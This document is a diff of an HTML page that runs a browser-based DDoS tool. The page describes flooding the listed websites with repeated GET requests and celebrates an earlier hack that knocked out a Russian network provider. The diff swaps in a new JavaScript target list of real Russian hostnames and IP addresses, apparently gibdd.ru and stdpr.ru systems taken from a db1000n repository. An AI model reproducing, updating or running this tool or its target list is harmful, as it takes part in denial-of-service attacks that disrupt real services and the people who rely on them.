@@ -148,13 +148,13 @@
       This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
   <hr style=" margin-top: 3px; margin-bottom: 3px;">
       <p><span style="font-size:14px;"><u></u><strong>Todays message from the IT Army of Ukraine: </strong></span>&nbsp;<br>
-    &nbsp; &nbsp; &nbsp; IT community, your skills are vital for the Ukrainian army right<br>
-    &nbsp; &nbsp; &nbsp; now! The Ministry of <a href="https://mezha.media/en/2023/07/04/digitization-of-the-ukrainian-army-the-ministry-of-defense-is-looking-for-it-specialists-and-lawyers/" target="_blank">Defense of Ukraine requests your</a><br>
-    &nbsp; &nbsp; &nbsp; <a href="https://mezha.media/en/2023/07/04/digitization-of-the-ukrainian-army-the-ministry-of-defense-is-looking-for-it-specialists-and-lawyers/" target="_blank">assistance in the digital transformation of the military sector.</a><br>
-    &nbsp; &nbsp; &nbsp; This is an opportunity to make a real contribution to the<br>
-    &nbsp; &nbsp; &nbsp; future of our country. Join the team that's leading Ukraine to<br>
-    &nbsp; &nbsp; &nbsp; victory through technology."<br>
-    &nbsp; &nbsp; &nbsp; Send your resume to <a href="mailto:hr@mil.gov.ua">hr@mil.gov.ua</a>. Glory to Ukraine!<span style="font-size:14px;"><u></u><strong><br>
+    &nbsp; &nbsp; &nbsp; Remember our epic hack of "Dom.ru" on February 12th?<br>
+    &nbsp; &nbsp; &nbsp; <a href="https://www.forbes.ru/tekhnologii/492013-i-vnov-prodolzaetsa-sboj-pocemu-stoit-zdat-novyh-problem-v-rabote-operatorov-svazi" target="_blank">Turns out, tens of thousands of devices vanished from</a><br>
+    &nbsp; &nbsp; &nbsp; <a href="https://www.forbes.ru/tekhnologii/492013-i-vnov-prodolzaetsa-sboj-pocemu-stoit-zdat-novyh-problem-v-rabote-operatorov-svazi" target="_blank">the "Prestige-Internet"</a> network, and it took a whole<br>
+    &nbsp; &nbsp; &nbsp; month to fully recover.<br>
+    &nbsp; &nbsp; &nbsp; Can you imagine the bill that Alfa Bank, Sber, Lukoil,<br>
+    &nbsp; &nbsp; &nbsp; and the others got? We've got something to be proud of,<br>
+    &nbsp; &nbsp; &nbsp; don't we?<span style="font-size:14px;"><u></u><strong><br>
       Additional message for newly added targets:&nbsp;&nbsp;<br></strong>
     &nbsp; &nbsp; &nbsp; To keep up with targets we're going to use the db1000n targets<br>
     &nbsp; &nbsp; &nbsp; direct from their GitHub repository.<br>
@@ -298,33 +298,21 @@
           // target list
           var urls = [
           //Targets from DB1000n Github Update
-		    'http://anyconnect2.kassir.ru',
-		    'http://hm.kassir.ru',
-		    'http://report.kassir.ru',
-		    'http://cdn.kassir.ru',
-		    'http://94.140.212.97',
-		    'http://report-crocus.kassir.ru',
-		    'http://94.140.212.95',
-		    'http://94.140.212.89',
-		    'http://94.140.212.242',
-		    'http://kassir.ru',
-		    'http://api.kassir.ru',
-		    'http://94.140.212.94',
-		    'http://94.140.212.88',
-		    'https://94.140.212.242',
-		    'https://hm.kassir.ru',
-		    'https://94.140.212.89',
-		    'https://imap.kassirdev.ru',
-		    'https://94.140.212.88',
-		    'https://smtp.kassir.ru',
-		    'https://94.140.212.95',
-		    'https://api.kassir.ru',
-		    'https://94.140.212.94',
-		    'https://kassir.ru',
-		    'https://anyconnect2.kassir.ru',
-		    'https://cdn.kassir.ru',
-		    'https://report.kassir.ru',
-		    'https://report-crocus.kassir.ru',
+		    'logfab.stdpr.ru',
+		    'fcvid.stdpr.ru',
+		    '194.8.71.22',
+		    'bitrix.stdpr.ru',
+		    '59.gibdd.ru',
+		    '194.8.70.66',
+		    'fp01.stdpr.ru',
+		    'check.gibdd.ru',
+		    'v2.gibdd.ru',
+		    'wiki.gibdd.ru',
+		    'mps-git.stdpr.ru',
+		    'fc.stdpr.ru',
+		    'admin.gibdd.ru',
+		    'vpn.stdpr.ru',
+		    '74.gibdd.ru',
           ];
           // initialize variables
           var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
